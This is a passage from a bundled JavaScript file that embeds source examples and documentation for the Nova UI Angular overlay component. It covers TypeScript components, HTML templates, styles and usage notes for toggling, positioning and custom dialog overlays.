0;\n        min-height: 150px;\n        border: 1px hotpink dashed;\n    }\n}\n\n.overlay-class {\n    &_1 {\n        background-color: khaki;\n        opacity: 0.7;\n    }\n\n    &_2 {\n        background-color: lightskyblue;\n        opacity: 0.8;\n    }\n}\n"},91695:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    FlexibleConnectedPositionStrategy,\n    OverlayRef,\n} from "@angular/cdk/overlay";\nimport { Component, ViewChild, ViewEncapsulation } from "@angular/core";\n\nimport { DialogService, NuiDialogRef, OverlayComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-overlay-custom-dialog",\n    templateUrl: "./overlay-custom-dialog.component.html",\n    styleUrls: ["./overlay-custom-dialog.component.less"],\n    encapsulation: ViewEncapsulation.None,\n})\nexport class OverlayCustomDialogComponent {\n    private overlayRef: OverlayRef;\n    private activeDialog: NuiDialogRef;\n\n    @ViewChild("overlay1") overlay1: OverlayComponent;\n    @ViewChild("overlay2") overlay2: OverlayComponent;\n\n    constructor(private dialogService: DialogService) {}\n\n    triggerOverlay(ref: HTMLElement, overlay: OverlayComponent): void {\n        // Here we set the new element reference to the overlay conponent. The overlay will now connect to it\n        overlay.toggleReference = ref;\n        // Toggling the overlay to get an access to the \'overlayRef\'\n        overlay.toggle();\n\n        this.overlayRef = overlay.getOverlayRef();\n        // Here we update the positions for the overlay. By default, the overlay service connects the overlay to the bottom-left\n        // corner of the toggle reference element. We change this behavior here by setting new positions, since we want overlay to\n        // stick to the upper-top corner of the parent container\n        (\n            this.overlayRef.getConfig()\n                .positionStrategy as FlexibleConnectedPositionStrategy\n        ).withPositions([\n            {\n                originX: "start",\n                originY: "top",\n                overlayX: "start",\n                overlayY: "top",\n            },\n        ]);\n        // We update the size of the overlay container to follow the dimentions of the new \'toggle reference\' container we set in the very first step\n        this.overlayRef.updateSize({\n            width: ref.getBoundingClientRect().width,\n            height: ref.getBoundingClientRect().height,\n        });\n    }\n}\n'},22915:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button #toggleButton type="button" (click)="popup.toggle()" i18n>\n    Overlay component with Custom Styles\n</button>\n\n<nui-overlay\n    #popup\n    [toggleReference]="toggleButton[\'el\'].nativeElement"\n    [overlayConfig]="config"\n>\n    <ng-container *ngFor="let item of itemsSource">\n        <nui-overlay-item class="list-item">{{ item }}</nui-overlay-item>\n    </ng-container>\n</nui-overlay>\n'},85671:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="// This is how the global styles look like\n\n.nui-overlay-styling-demo-custom-class {\n    border: 1px solid red;\n\n    .nui-overlay {\n        border: 2px red dashed;\n        padding: 10px;\n        background-color: antiquewhite;\n    }\n}\n"},91707:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport { Component, ViewEncapsulation } from "@angular/core";\n\nimport { OVERLAY_WITH_POPUP_STYLES_CLASS } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-overlay-custom-styles-example",\n    templateUrl: "./overlay-custom-styles.example.component.html",\n    styleUrls: ["./overlay-custom-styles.example.component.less"],\n    // This is done to make class from the less file global.\n    // Make sure the class from the less file is added to your global style sheet.\n    encapsulation: ViewEncapsulation.None,\n})\nexport class OverlayCustomStylesExampleComponent {\n    public itemsSource: string[] = [\n        $localize`Item 1`,\n        $localize`Item 2`,\n        $localize`Item 3`,\n        $localize`Item 4`,\n    ];\n\n    public config: OverlayConfig = {\n        panelClass: [\n            OVERLAY_WITH_POPUP_STYLES_CLASS,\n            "nui-overlay-styling-demo-custom-class",\n        ],\n    };\n}\n'},54081:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>&lt;nui-overlay&gt;</code> is a base component for the most of\n    dropdown-like Nova components, but this doesn\'t limit it\'s abilities. It\n    allows you to put any content into it\'s body to build more complex and\n    exciting components. <br /><br />\n\n    How <code>nui-overlay</code> is different from the legacy\n    <code>nui-popup</code>? The <code>nui-overlay</code> it is built using the\n    modern and powerful <code>CDK Overlay</code> kindly provided, and well\n    supported by <code>Angular CDK</code> team. It provides a better\n    flexibility, customization, and in general is extremely easy to use.\n</p>\n<nui-message [allowDismiss]="false" type="warning">\n    <strong>Pay attention!</strong> The following examples demonstrate only\n    basic scenarios. To get familiar with more complex use cases, you can refer\n    to the documentation for components built on top of the\n    <code>nui-overlay</code>, such as\n    <a href="../components/ComboboxV2Component.html#example" target="_blank"\n        >nui-combobox-v2</a\n    >,\n    <a href="../components/SelectV2Component.html#example" target="_blank"\n        >nui-select-v2</a\n    >, etc., and explore their internal structure in the codebase.\n</nui-message>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiOverlayModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    A simple popup can be added to the page by adding a\n    <code>&lt;nui-overlay&gt;</code> element. Inside the\n    <code>nui-overlay</code> element put anything you see as its content. Then\n    define an element which will be a toggle for the <code>nui-overlay</code> at\n    the same level, and sent it as a reference to the popup\'s\n    <code>toggleReference</code> @Input. That is it!\n\n    <nui-message type="info">\n        By default, <code>nui-overlay</code> can be closed only by toggling it\n        via its <code>toggleReference</code> component, which means it won\'t\n        close if click evens are triggered anywhere else on the page. Meaning\n        this, it is recommended to subscribe to the popup\'s\n        <code>clickOutside</code> @Output and close the nui-overlay using it\'s\n        public <code>toggle()</code> method.\n    </nui-message>\n</p>\n<nui-example-wrapper\n    filenamePrefix="overlay-simple-usage.example"\n    exampleTitle="Basic Usage"\n>\n    <nui-overlay-simple-usage-example></nui-overlay-simple-usage-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n<h2>Using with popup styles</h2>\n<p>\n    By default, overlay doesn\'t have a specific styling. You can apply popup\n    styles to the basic overlay component. It includes such properties as\n    <code>paddings</code>, <code>background-color</code> etc.\n</p>\n<p>\n    To do that, you have to pass <code>"with-popup-styles"</code> class as a\n    <code>panelClass</code> for the <code>overlayConfig</code>. You can import\n    <code>OVERLAY_WITH_POPUP_STYLES_CLASS</code> from\n    <code>@nova-ui/bits</code> or just pass <code>"with-popup-styles"</code> as\n    a string.\n</p>\n<nui-example-wrapper\n    filenamePrefix="overlay-popup-styles.example"\n    exampleTitle="Using with popup styles"\n>\n    <nui-overlay-popup-styles-example></nui-overlay-popup-styles-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Overlay Configuration</h2>\n<p>\n    <code>nui-overlay</code> has all the benefits the\n    <code>Angular CDK Overlay</code> provides, including a rich and flexible\n    configuration. Use <code>overlayConfig</code> @Input of the component and\n    follow the interface to configure the overlay to your likings. Please also\n    reference the\n    <a href="https://material.angular.io/cdk/overlay/api#OverlayConfig">\n        official Angular CDK documentation</a\n    >\n    to see more information on how to configure the overlay.\n</p>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Viewport Margin</h2>\n<p>\n    You can easily manage edges of the container using\n    <code>viewportMargin</code> input. It sets a minimum distance in px the\n    overlay may be positioned to the edge of the viewport. Default value of\n    <code>viewportMargin</code> is 30px.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="overlay-viewport-margin.example"\n    exampleTitle="Viewport Margin Example"\n>\n    <nui-overlay-viewport-margin-example></nui-overlay-viewport-margin-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Toggle Types</h2>\n<p>\n    Not only the <code>toggleReference</code> is bale to show the\n    <code>nui-overlay</code> up. The popover can be toggled with any other\n    clickable element on the page. The public methods responsible for this are\n    quite self-descriptive: <code>show()</code> will only pop the popup up,\n    <code>hide()</code> will hide the popup from the view, and\n    <code>toggle()</code> will do both. This adds a flexibiility on how you want\n    your popup-ve to get toggled.\n</p>\n\n<nui-message type="info">\n    Notice below how <code>nui-overlay</code> is not closed if you click outside\n    of its <code>toggleReference</code>. This is because we do not subscribe to\n    its <code>clickOutside</code> @Output, and so we are only able to close the\n    popup via a specific button, like <code>Hide</code>, or <code>Toggle</code>.\n</nui-message>\n\n<nui-example-wrapper\n    filenamePrefix="overlay-show-hide-toggle.example"\n    exampleTitle="Types of Overlay component Toggle"\n>\n    <nui-overlay-show-hide-toggle-example></nui-overlay-show-hide-toggle-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Custom Styles</h2>\n<p>\n    In case tweaking the <code>nui-overlay</code> overlay styles via the\n    <code>overlayConfig</code> was not enough, and brute force is needed, one\n    can use the <code>styles</code> @Input to pass in the object with the inline\n    styles to throw into the overlay.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="overlay-custom-styles.example"\n    exampleTitle="Custom Styles Example"\n>\n    <nui-overlay-custom-styles-example></nui-overlay-custom-styles-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Custom Container</h2>\n<p>\n    By default, the <code>nui-overlay</code> container appends to body. This is\n    a default behavior suggested by the angular material cdk overlay. But there\n    are cases when it is necessary to have overlay container append to some\n    custom container. It is possible to attache the popup container to any\n    custom container by simply providing either a <code>selector</code>, or an\n    <code>element reference</code> to the <code>customContainer</code> @Input.\n    See two ways of doing that in the example below.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="overlay-custom-container.example"\n    exampleTitle="Custom Container Example"\n>\n    <nui-overlay-custom-container-example></nui-overlay-custom-container-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Positioning and Arrow</h2>\n<p>\n    By default, <code>&lt;nui-overlay&gt;</code> can be opened\n    <code>top</code> or <code>bottom</code>.\n</p>\n<p>\n    It\'s possible to apply custom positioning to the\n    <code>&lt;nui-overlay&gt;</code>. For that, use\n    <a href="../../classes/OverlayPositionService.html" target="_blank"\n        >OverlayPositionService</a\n    >\n    (see usage in the example). It returns a set of available positions\n    prioritizing them e.g. for <code>top</code> it will be: <code>top</code>,\n    <code>bottom</code>, <code>left</code>, <code>right</code>.\n</p>\n<p>\n    Also, <code>&lt;nui-overlay&gt;</code> support using arrow at the edge of\n    the overlay that points to the toggle reference. To use that, you need to\n    put <code>&lt;nui-overlay-arrow&gt;</code> inside the\n    <code>&lt;nui-overlay&gt;</code> (as in the example).\n</p>\n<p>\n    Arrow positioning uses specific CSS classes that are added automatically if\n    using\n    <a href="../../classes/OverlayPositionService.html" target="_blank"\n        >OverlayPositionService</a\n    >. So, to use arrow inside the overlay you need to get a set of available\n    positions with OverlayPositionService, pass them to the overlay component\n    (see example) and put <code>&lt;nui-overlay-arrow&gt;</code> inside the\n    <code>&lt;nui-overlay&gt;</code> template.\n</p>\n<p>\n    <strong\n        >Drag the toggle to the edges of the viewport to see how it\n        behaves.</strong\n    >\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="overlay-arrow.example"\n    exampleTitle="Positioning and Arrow"\n>\n    <nui-overlay-arrow-example></nui-overlay-arrow-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n<h2>Setting Up Scrollable Containers</h2>\n<p>\n    By default, <code>cdk-overlay</code> reacts on <code>document</code> scroll\n    events, but there are numerous cases when multiple scrollable containers on\n    the page are possible, or the scrollable container appears is a different\n    place in the DOM, e.g. inside the appended to body overlay container. In\n    this case it is advised to set the\n    <code\n        ><a\n            href="https://material.angular.io/cdk/scrolling/api#CdkScrollable"\n            target="_blank"\n            >cdkScrollable</a\n        ></code\n    >\n    directive to the container considered scrollable.\n</p>\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Custom Dialog Overlay</h2>\n<p>\n    There are numerous cases when a user would want a lightweight dialog-looking\n    overlay placed over the parent container to quickly confirm things, or make\n    sure a users are immediately informed about any sort of state, progress etc.\n    This can be done fast and easily with <code>nui-overlay</code> component\n    with a few lines of code involved. By default, the <code>nui-overlay</code>\n    position strategy is configured to attach the created cdk overlay to the\n    bottom-left corner of the toggle reference, so it could be easily used for\n    the most common use cases - selects, menus, comboboxes etc. To fill the\n    parent container with the overlay we need to set new positions, so that the\n    overlay would be attached to the top-left corner of the toggle reference\n    container. Afterwards, all we need is toggle the overlay and using its\n    overlay reference adjust the size of the overlay to the dimensions of the\n    toggle reference container. And that\'s it! Please check the comments in the\n    code snippets below.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="overlay-custom-dialog"\n    exampleTitle="Custom Dialog Overlay"\n>\n    <nui-overlay-custom-dialog></nui-overlay-custom-dialog>\n</nui-example-wrapper>\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Custom Dialog Overlay Inside the nui-dialog</h2>\n<p>\n    This is yet another use case of the dialog-like overlay, this time inside\n    the <code>nui-dialog</code> component. Click the button in the exampel below\n    and attempt to cancel the dialog.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="custom-confirmation-inside-dialog"\n    exampleTitle="Custom Overlay Dialog inside the nui-dialog"\n>\n    <nui-custom-confirmation-inside-dialog></nui-custom-confirmation-inside-dialog>\n</nui-example-wrapper>\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n'},5197:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-overlay-docs-example",\n    templateUrl: "./overlay-docs.example.component.html",\n})\nexport class OverlayDocsComponent {}\n'},82529:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    #toggleButton\n    type="button"\n    [isEmpty]="false"\n    (click)="overlayWithStyles.toggle()"\n    i18n\n>\n    With popup styles\n</button>\n\n<nui-overlay\n    #overlayWithStyles\n    [toggleReference]="toggleButton[\'el\'].nativeElement"\n    [overlayConfig]="overlayConfig"\n>\n    <div style="width: 300px">\n        Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod\n        tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim\n        veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea\n        commodo consequat. Duis aute irure dolor in reprehenderit in voluptate\n        velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint\n        occaecat cupidatat non proident, sunt in culpa qui officia deserunt\n        mollit anim id est laborum\n    </div>\n</nui-overlay>\n\n<button\n    nui-button\n    #toggleButton2\n    type="button"\n    [isEmpty]="false"\n    (click)="overlayNoStyles.toggle()"\n    style="float: right"\n    i18n\n>\n    No popup styles\n</button>\n\n<nui-overlay\n    #overlayNoStyles\n    [toggleReference]="toggleButton2[\'el\'].nativeElement"\n>\n    <div style="width: 300px">\n        Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod\n        tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim\n        veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea\n        commodo consequat. Duis aute irure dolor in reprehenderit in voluptate\n        velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint\n        occaecat cupidatat non proident, sunt in culpa qui officia deserunt\n        mollit anim id est laborum\n    </div>\n</nui-overlay>\n'},20013:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport { AfterViewInit, Component, OnDestroy, ViewChild } from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    OverlayComponent,\n    OVERLAY_WITH_POPUP_STYLES_CLASS,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-overlay-popup-styles-example",\n    templateUrl: "./overlay-popup-styles.example.component.html",\n})\nexport class OverlayPopupStylesExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    private readonly destroy$ = new Subject<void>();\n\n    public overlayConfig: OverlayConfig = {\n        panelClass: [OVERLAY_WITH_POPUP_STYLES_CLASS],\n    };\n\n    @ViewChild("overlayWithStyles") public overlayWithStyles: OverlayComponent;\n    @ViewChild("overlayNoStyles") public overlayNoStyles: OverlayComponent;\n\n    public ngAfterViewInit(): void {\n        this.overlayWithStyles.clickOutside\n            .pipe(takeUntil(this.destroy$))\n            .subscribe((_) => this.overlayWithStyles.hide());\n\n        this.overlayNoStyles.clickOutside\n            .pipe(takeUntil(this.destroy$))\n            .subscribe((_) => this.overlayNoStyles.hide());\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n}\n'},94177:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex">\n    <button nui-button #toggleButton type="button" class="mr-5" i18n>\n        Overlay component Appears Here\n    </button>\n    <button nui-button type="button" (click)="popup.show()" i18n>Show</button>\n    <button nui-button type="button" (click)="popup.hide()" i18n>Hide</button>\n    <button nui-button type="button" (click)="popup.toggle()" i18n>\n        Toggle\n    </button>\n</div>\n\n<nui-overlay #popup [toggleReference]="toggleButton[\'el\'].nativeElement">\n    <img\n        src="https://cdn.stocksnap.io/img-thumbs/960w/thumbs%20up-hand_QUWPLI693K.jpg"\n        alt="Thumbs up"\n        class="w-100"\n    />\n</nui-overlay>\n'},57709:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-overlay-show-hide-toggle-example",\n    templateUrl: "./overlay-show-hide-toggle.example.component.html",\n})\nexport class OverlayShowHideToggleExampleComponent {}\n'},4811:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    #toggleButton\n    type="button"\n    [isEmpty]="false"\n    (click)="overlay.toggle()"\n    i18n\n>\n    Toggle the Overlay\n</button>\n\n<nui-overlay #overlay [toggleReference]="toggleButton[\'el\'].nativeElement">\n    <img\n        src="https://cdn.stocksnap.io/img-thumbs/960w/thumbs%20up-hand_QUWPLI693K.jpg"\n        alt="Thumbs up"\n        class="w-100"\n    />\n</nui-overlay>\n'},61043:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, ViewChild } from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport { OverlayComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-overlay-simple-usage-example",\n    templateUrl: "./overlay-simple-usage.example.component.html",\n})\nexport class OverlaySimpleExampleComponent implements AfterViewInit {\n    private readonly destroy$ = new Subject<void>();\n\n    @ViewChild(OverlayComponent) public overlay: OverlayComponent;\n\n    public ngAfterViewInit(): void {\n        this.overlay.clickOutside\n            .pipe(takeUntil(this.destroy$))\n            .subscribe((_) => this.overlay.hide());\n    }\n}\n'},52963:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=""},15719:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// The following styles are used for demonstration purposes only\n.nui-demo-custom-class {\n    background-color: yellowgreen !important;\n    font-family: "Courier New", Courier, monospace;\n    font-weight: bold;\n    text-decoration: underline overline black dotted;\n    padding: 20px;\n}\n'},45499:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\n@Component({\n    selector: "nui-overlay-test",\n    templateUrl: "./overlay-test.example.component.html",\n    styleUrls: ["overlay-test.example.component.less"],\n    encapsulation: ViewEncapsulation.None,\n})\nexport class OverlayTestComponent {}\n'},50584:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport {\n    AfterViewInit,\n    Component,\n    OnDestroy,\n    ViewChild,\n    ViewEncapsulation,\n} from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    OverlayComponent,\n    OVERLAY_WITH_POPUP_STYLES_CLASS,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-overlay-viewport-margin-example",\n    templateUrl: "./overlay-viewport-margin.example.component.html",\n    encapsulation: ViewEncapsulation.Emulated,\n})\nexport class OverlayViewportMarginExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public viewportMargin: number;\n    public items = Array.from({ length: 50 }).map((_, i) => `Item ${i}`);\n    public overlayConfig: OverlayConfig = {\n        panelClass: OVERLAY_WITH_POPUP_STYLES_CLASS,\n    };\n\n    private readonly destroy$ = new Subject<void>();\n\n    @ViewChild(OverlayComponent) public overlay: OverlayComponent;\n\n    public 